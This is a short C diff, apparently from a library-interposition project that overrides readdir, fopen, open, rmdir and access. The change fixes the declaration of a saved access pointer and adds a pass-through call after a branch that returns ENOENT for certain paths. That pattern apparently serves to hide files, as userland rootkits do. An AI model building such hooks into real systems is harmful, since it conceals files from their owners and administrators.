@@ -19,7 +19,7 @@ static struct dirent* (*old_readdir)(DIR *dir) = NULL;
 static struct dirent64* (*old_readdir64)(DIR *dir) = NULL;
 static FILE* (*old_fopen)(const char *path, const char *mode) = NULL;
 static FILE* (*old_fopen64)(const char *path, const char *mode) = NULL;
-static int access(const char *path, int mode) = NULL;
+static int (*old_access)(const char *path, int mode) = NULL;
 static int (*old_open)(const char *path, int flags, mode_t mode) = NULL;
 static int (*old_openat)(int fd, const char *pathname, int flags, mode_t mode) = NULL;
 static int (*old_rmdir)(const char *path) = NULL;
@@ -160,6 +160,7 @@ int access(const char *path, int mode) {
         errno = ENOENT;
         return -1;
     }
+    return old_access(path, mode);
 }
 
 
